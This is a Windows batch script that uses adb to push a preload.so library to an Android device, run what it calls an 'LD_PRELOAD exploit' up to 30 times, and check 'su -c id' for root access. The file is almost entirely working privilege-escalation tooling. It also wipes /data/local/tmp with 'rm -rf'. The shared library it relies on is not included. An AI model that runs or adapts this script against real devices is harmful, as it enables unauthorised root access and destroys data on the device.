@echo off
setlocal enabledelayedexpansion
cd /d "%~dp0"

echo [*] Clearing temp folder...
adb shell rm -rf /data/local/tmp/*

echo [*] Pushing preload.so to device...
adb push preload.so /data/local/tmp/preload.so

echo [*] Setting permissions...
adb shell chmod 755 /data/local/tmp/preload.so

set "count=0"
:get_root
set /a count+=1
echo [*] Executing LD_PRELOAD exploit (Attempt !count!/30)...
adb shell "LD_PRELOAD=/data/local/tmp/preload.so id"

echo [*] Checking Root Access...
for /f "delims=" %%i in ('adb shell "su -c id" 2^>^&1') do (
    echo [SU Output]: %%i
    echo %%i | findstr "uid=0(root)" >nul
    if !errorlevel! equ 0 (
        echo [+] Root access obtained successfully!
        goto finish
    )
)

if !count! geq 30 (
    echo [-] Error: Failed to get root access after 30 attempts.
    exit /B 1
)
timeout /t 1 /nobreak >nul
goto get_root

:finish
echo ===================================================
echo [+] Temp Root environment is ready!
echo ===================================================
exit /B 0